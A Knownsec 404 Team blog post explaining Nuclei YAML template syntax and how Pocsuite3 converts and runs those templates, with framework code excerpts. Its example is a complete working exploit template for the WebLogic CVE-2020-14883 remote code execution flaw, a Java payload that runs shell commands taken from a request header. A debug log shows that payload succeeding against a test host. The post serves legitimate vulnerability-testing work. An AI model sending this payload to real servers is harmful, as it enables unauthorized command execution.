**Author: fenix@Knownsec 404 Team  
Chinese version: <https://paper.seebug.org/2015/>**

## Introduction

Pocsuite3 is an open source remote vulnerability testing framework built by
Knownsec 404 Team based on the GPLv2 license [1](https://pocsuite.org
"Pocsuite3 框架"). The framework itself is developed using Python3 and
integrates the APIs of many security services such as ZoomEye, Shodan, CEye,
Interactsh, etc. Users can quickly write PoC/Exp based on Pocsuite3, verify
the vulnerability of batch targets and obtain summary results.

Nuclei is a customized, fast vulnerability scanner based on YAML syntax
templates open sourced by projectdiscovery
[2](https://nuclei.projectdiscovery.io " Nuclei 框架"). Nuclei defines a set of
syntax for sending requests to the target and matching the response to
determine whether the vulnerability has been successfully verified. It
supports TCP, HTTP and other protocols. Nuclei's community is very active, and
the nuclei-templates project provides thousands of community-maintained PoC
templates [3](https://github.com/projectdiscovery/nuclei-templates "nuclei-templates 项目").

Compared with Nuclei, Pocsuite3 is more flexible and can directly use a large
number of third-party libraries. It is very convenient for some
vulnerabilities involving complex protocols, and users can quickly get started
as long as they can write Python. Starting from the `2.0.0` version, Pocsuite3
supports PoC in YAML format and is compatible with Nuclei, and can directly
use the Nuclei template.

This article briefly talks about the Nuclei YAML syntax template and how
Pocsuite3 is compatible. Further details about Nuclei templates can be found
in the official Nuclei documentation.

## Nuclei YAML syntax template

YAML is a data serialization language commonly used to write configuration
files. Its basic syntax rules are as follows (source: Ruan Yifeng's YAML
Language Tutorial【4】).

>   * Case sensitivity.
>   * Use indentation to represent hierarchical relationships.
>   * Tab key is not allowed when indenting, only spaces are allowed.
>   * The number of indented spaces does not matter,, as long as the elements
> of the same level are aligned to the left.
>

`#` Represents a comment, which is ignored by the parser from this character
to the end of the line.

There are three types of data structures supported by YAML.

>   * Object: A collection of key-value pairs, represented by a colon
> structure.
>   * Array: A set of values in order, also known as a sequence / list. A set
> of lines at the beginning of a hyphen that forms an array. If the child
> members of the data structure are an array, you can indent a space below the
> item.
>   * Scalars: Single, non-separable values, such as strings, integers,
> Booleans, etc.
>

Take `nuclei-templates/cves/2020/CVE-2020-14883.yaml` as an example:

    
    
    id: CVE-2020-14883
    
    info:
      name: Oracle Fusion Middleware WebLogic Server Administration Console - Remote Code Execution
      author: pdteam
      severity: high
      description: The Oracle Fusion Middleware WebLogic Server admin console in versions 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 is vulnerable to an easily exploitable vulnerability that allows high privileged attackers with network access via HTTP to compromise Oracle WebLogic Server.
      reference:
        - https://packetstormsecurity.com/files/160143/Oracle-WebLogic-Server-Administration-Console-Handle-Remote-Code-Execution.html
        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14883
        - https://www.oracle.com/security-alerts/cpuoct2020.html
        - http://packetstormsecurity.com/files/160143/Oracle-WebLogic-Server-Administration-Console-Handle-Remote-Code-Execution.html
      classification:
        cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
        cvss-score: 7.2
        cve-id: CVE-2020-14883
      tags: oracle,rce,weblogic,kev,packetstorm,cve,cve2020
    
    requests:
      - raw:
          - |
            POST /console/images/%252e%252e%252fconsole.portal HTTP/1.1
            Host: {{Hostname}}
            Accept-Language: en
            CMD: {{cmd}}
            Content-Type: application/x-www-form-urlencoded
            Accept-Encoding: gzip, deflate
    
            test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("CMD");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')
    
        payloads:
          cmd:
            - id
    
        matchers-condition: and
        matchers:
          - type: word
            part: header
            words:
              - "ADMINCONSOLESESSION"
    
          - type: word
            part: body
            words:
              - 'uid='
              - 'gid='
              - 'groups='
            condition: and
    
          - type: status
            status:
              - 200
    
        extractors:
          - type: regex
            regex:
              - "(u|g)id=.*"
    
    # Enhanced by mp on 2022/04/20

This template can be roughly divided into the following parts:

    
    
    id: str  # The template's unique ID, a required field.
    info: {k: v}  # Vulnerability information fields, including vulnerability name, author, vulnerability severity, vulnerability description, reference connection, score, vulnerability label, etc., are basically optional fields.
    variables: {k: v}  # Global variable, the value can be a string or an expression, not provided in the template above.
    requests: []  # HTTP requests defined (core part)

At the core is the requests section, which stands for defining an HTTP
request. Nuclei supports a variety of protocols. For example, if you want to
define TCP requests, you need to use the network field.

The syntax of requests is as follows, and each element contains
single/multiple HTTP requests, payloads (optional), matching rules, and
decompression rules (optional). In most cases, defining one is sufficient.

    
    
    requests
      # Method 1: raw request
      - raw:
          - |
            GET /index.php HTTP/1.1   
    
          - |
            POST /index.php HTTP/1.1
            Host: {{Hostname}}
            Accept-Language: en
    
            ...
      # Method 2: GET, POST, PUT, DELETE request
      - method: GET
        path:
          - "{{BaseURL}}/login.php"
          - "{{BaseURL}}/index.php"  
        headers: {}  
    
        # payload combination mode
        attack: clusterbomb
        # The provided payload is used to request filling
        payloads: {}
        # Decompression rules are used to extract information from the previous request response for subsequent request filling or result return.
        extractors: []
        # Match the defined requests after sending them
        req-condition: false
        # Return when the first match is hit
        stop-at-first-match: true
        # Logical relationship of matching rules. If it is and, all matching conditions must be true.
        matchers-condition: and
        # Matching Rules
        matchers: []

Two methods are supported for defining http requests: 1. define method, path,
headers, and body respectively; 2. Provide the original http request directly.
The request will contain a dynamic value in the form of `{{variable name or
expression}}`, which needs to be replaced before sending the request. The
variable namespace is provided by the value extracted from variables,
payloads, and extractors, as well as the target url. Dynamic values will also
be included in decompression rules and matching rules.

Extractors have the following types:

  1. regex, regular extraction; 
  2. kval, a key pair, such as extracting the specified response header; 
  3. JSON, using the syntax of JQ to extract JSON data; 
  4. xpath, use xpath to extract html response data; 
  5. DSL, using expression extraction, not commonly used. 

The decompression rules of `WebLogic CVE-2020-14883` are defined as follows,
and the execution results of the id command are extracted using regular rules.

    
    
    extractors:
          - type: regex
            regex:
              - "(u|g)id=.*"

The types of matchers are defined as follows:

  1. status, matching the HTTP response status code; 
  2. size, matching length, such as Conteng-Length; 
  3. Word, string matching; 
  4. regex, regular matching; 
  5. binary, binary data matching; 
  6. DSL, using complex expressions for matching; 

For example:

    
    
    matchers:
      # Performs a string match for the response headers
      - type: word
        part: header
        words:
          - "ADMINCONSOLESESSION"
    
      # String matching is performed on the response body, and all substrings should be included.
      - type: word
        part: body
        words:
          - 'uid='
          - 'gid='
          - 'groups='
        condition: and
    
      # Match http response status code
      - type: status
        status:
          - 200

Above we have introduced the meaning of each part. In general, the running
process of the engine is as follows:

  1. Iterate over all payloads combinations; 
  2. For each payloads combination, send the defined requests sequentially and obtain the response results (need to replace the dynamic values in the request); 
  3. Traverse all decompression rules, extract information from the response, merge into the local variable namespace, or use it for result return (controlled by internal variables);
  4. If the value of `req-conditio` is true, jump to 2 to continue sending the next request; Extract each part of the response result and save it to the local variable namespace, such as `status_ code_ 1`、`body_ 2`。 
  5. Traverse the matching rule to get the matching result. If it matches, return it, otherwise continue; 

## Pocsuite3 is compatible with some implementation details of nuclei

### How the YAML format PoC is compatible with the original framework

We don't want to change the way Pocsuite3 registers PoC to the framework, so
we have implemented Nuclei as a relatively independent module and provided an
additional method. When the PoC is loaded by the framework, it is found in
YAML format, and will be automatically converted to PoC format of Pocsuite3.
Therefore, there is no difference in the use of YAML PoC and Python PoC
scripts.

    
    
    class nuclei:
    ...
       def __str__(self):
            """
            Convert nuclei template to Pocsuite3
            """
            info = []
            key_convert = {
                'description': 'desc',
                'reference': 'references'
            }
            for k, v in self.json_template['info'].items():
                if k in key_convert:
                    k = key_convert.get(k)
                if type(v) in [str]:
                    v = json.dumps(v.strip())
    
                info.append(f'    {k} = {v}')
    
            poc_code = [
                'from pocsuite3.api import POCBase, Nuclei, register_poc\n',
                '\n',
                '\n',
                'class TestPOC(POCBase):\n',
                '\n'.join(info),
                '\n',
                '    def _verify(self):\n',
                '        result = {}\n',
                '        if not self._check(is_http=%s):\n' % (len(self.template.requests) > 0),
                '            return self.parse_output(result)\n',
                "        template = '%s'\n" % binascii.hexlify(self.yaml_template.encode()).decode(),
                '        res = Nuclei(template, self.url).run()\n',
                '        if res:\n',
                '            result["VerifyInfo"] = {}\n',
                '            result["VerifyInfo"]["URL"] = self.url\n',
                '            result["VerifyInfo"]["Info"] = {}\n',
                '            result["VerifyInfo"]["Info"]["Severity"] = "%s"\n' % self.template.info.severity.value,
                '            if not isinstance(res, bool):\n'
                '               result["VerifyInfo"]["Info"]["Result"] = res\n',
                '        return self.parse_output(result)\n',
                '\n',
                '\n',
                'register_poc(TestPOC)\n'
            ]
            return ''.join(poc_code)

### How to load a YAML template

Golang can directly deserialize JSON data into structure. It can also do this
in Python 3 using dataclass and date libraries, as well as type checking. In
addition, variables in Python cannot contain horizontal lines, so data needs
to be preprocessed.

    
    
    @dataclass
    class Template:
        """Template is a YAML input file which defines all the requests and other metadata for a template.
        """
        id: str = ''
        info: Info = field(default_factory=Info)
        requests: List[HttpRequest] = field(default_factory=list)
        network: List[NetworkRequest] = field(default_factory=list)
        stop_at_first_match: bool = True
        variables: dict = field(default_factory=dict)
    
    class Nuclei:
        def __init__(self, template, target=''):
            self.yaml_template = template
            try:
                self.yaml_template = binascii.unhexlify(self.yaml_template).decode()
            except ValueError:
                pass
            self.json_template = yaml.safe_load(expand_preprocessors(self.yaml_template))
            self.template = dacite.from_dict(
                Template, hyphen_to_underscore(self.json_template),
                config=dacite.Config(cast=[Severify, ExtractorType, MatcherType, HTTPMethod, AttackType, NetworkInputType]))

### DSL expression execution

Most functions of DSL are implemented in Python, which limits the functions
and attributes that can be accessed by expressions, and is finally executed
through eval.

    
    
    def safe_eval(expression, variables):
        if not _check_expression(expression, allowed_variables=list(variables.keys())):
            expression = expression.replace(' && ', ' and ').replace(' || ', ' or ')
            if not _check_expression(expression, allowed_variables=list(variables.keys())):
                raise Exception(f"Invalid expression [{expression}], only a very simple subset of Python is allowed.")
        return eval(expression, globals(), variables)

### Using effects

Load the YAML template directly with `-r`, and set the log level through `-v`
to output the details of the template operation, including request and
response, expression execution, decompression rules, and matching rule
operation results.

    
    
    ?  ~ pocsuite -r ~/nuclei-templates/cves/2020/CVE-2020-14883.yaml -u  http://172.29.157.74:7001  -v 2                                   
    
    ,------.                        ,--. ,--.       ,----.   {2.0.1-cb758d9}
    |  .--. ',---. ,---.,---.,--.,--`--,-'  '-.,---.'.-.  |
    |  '--' | .-. | .--(  .-'|  ||  ,--'-.  .-| .-. : .' <
    |  | --'' '-' \ `--.-'  `'  ''  |  | |  | \   --/'-'  |
    `--'     `---' `---`----' `----'`--' `--'  `----`----'   https://pocsuite.org
    [*] starting at 18:34:40
    
    [18:34:40] [INFO] loading PoC script '/Users/fenix/nuclei-templates/cves/2020/CVE-2020-14883.yaml'
    [18:34:41] [INFO] pocsusite got a total of 1 tasks
    [18:34:41] [DEBUG] pocsuite will open 1 threads
    [18:34:41] [INFO] running poc:'Oracle Fusion Middleware WebLogic Server Administration Console - Remote Code Execution' target 'http://172.29.157.74:7001'
    [18:34:52] [DEBUG] < POST /console/images/%252e%252e%252fconsole.portal HTTP/1.1
    < Host: 172.29.157.74:7001
    < User-Agent: Mozilla/5.0 (compatible; MSIE 5.0; Windows NT 6.0; Trident/4.0)
    < Accept-Encoding: gzip, deflate
    < Accept: */*
    < Connection: keep-alive
    < Accept-Language: en
    < CMD: id
    < Content-Type: application/x-www-form-urlencoded
    < Content-Length: 1166
    < 
    < test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod("getServletRequest").invoke(obj); String cmd = req.getHeader("CMD");String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')
    
    > HTTP/1.1 200 OK
    > Date: Wed, 09 Nov 2022 02:34:52 GMT
    > Transfer-Encoding: chunked
    > Content-Type: text/html; charset=UTF-8
    > Set-Cookie: ADMINCONSOLESESSION=hpNaPYWzVQlWjXS0qq3B6CBq43oDb1kLXFpPZS6iOBlsVxfbRC-2!-1601473325; path=/console/; HttpOnly
    > 
    uid=1000(oracle) gid=1000(oracle) groups=1000(oracle)
    
    [18:34:52] [DEBUG] [+] Extractor(name='', type=<ExtractorType.RegexExtractor: 'regex'>, regex=['(u|g)id=.*'], group=0, kval=[], json=[], xpath=[], attribute='', dsl=[], part='', internal=False, case_insensitive=False) -> {'internal': {}, 'external': {}, 'extra_info': ['uid=1000(oracle) gid=1000(oracle) groups=1000(oracle)']}
    [18:34:52] [DEBUG] [+] Matcher(type=<MatcherType.WordsMatcher: 'word'>, condition='or', part='header', negative=False, name='', status=[], size=[], words=['ADMINCONSOLESESSION'], regex=[], binary=[], dsl=[], encoding='', case_insensitive=False, match_all=False) -> True
    [18:34:52] [DEBUG] [+] Matcher(type=<MatcherType.WordsMatcher: 'word'>, condition='and', part='body', negative=False, name='', status=[], size=[], words=['uid=', 'gid=', 'groups='], regex=[], binary=[], dsl=[], encoding='', case_insensitive=False, match_all=False) -> True
    [18:34:52] [DEBUG] [+] Matcher(type=<MatcherType.StatusMatcher: 'status'>, condition='or', part='body', negative=False, name='', status=[200], size=[], words=[], regex=[], binary=[], dsl=[], encoding='', case_insensitive=False, match_all=False) -> True
    [18:34:52] [+] URL : http://172.29.157.74:7001
    [18:34:52] [+] Info : {'Severity': 'high', 'Result': [{'cmd': 'id', 'extra_info': ['uid=1000(oracle) gid=1000(oracle) groups=1000(oracle)']}]}
    [18:34:52] [INFO] Scan completed,ready to print
    
    +---------------------------+-----------------------------------------------------------------------------------------+--------+-----------+---------+---------+
    | target-url                |                                         poc-name                                        | poc-id | component | version |  status |
    +---------------------------+-----------------------------------------------------------------------------------------+--------+-----------+---------+---------+
    | http://172.29.157.74:7001 | Oracle Fusion Middleware WebLogic Server Administration Console - Remote Code Execution |   0    |           |         | success |
    +---------------------------+-----------------------------------------------------------------------------------------+--------+-----------+---------+---------+
    success : 1 / 1
    
    [*] shutting down at 18:34:52

Attached: Demo video.

## Conclusion

The current implementation can cover most HTTP and Network templates, and some
special features of Nuclei such as Workflows, conditional race requests, and
request comments, are not supported temporarily. The latest version has been
pushed to PyPI, Homebrew repository, Dockerhub, Archlinux, etc. After this
large version is stable, it will continue to be pushed to Debian, Kali, and
Ubuntu. If you find any problems in use, please submit an Issue or contribute
code.

## Reference

【1】: Pocsuite3 framework

<https://pocsuite.org>

【2】: Nuclei framework

<https://nuclei.projectdiscovery.io>

【3】: nuclei-templates project

<https://github.com/projectdiscovery/nuclei-templates>

【4】: YAML language tutorial

<https://www.ruanyifeng.com/blog/2016/07/yaml.html>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/2016/>

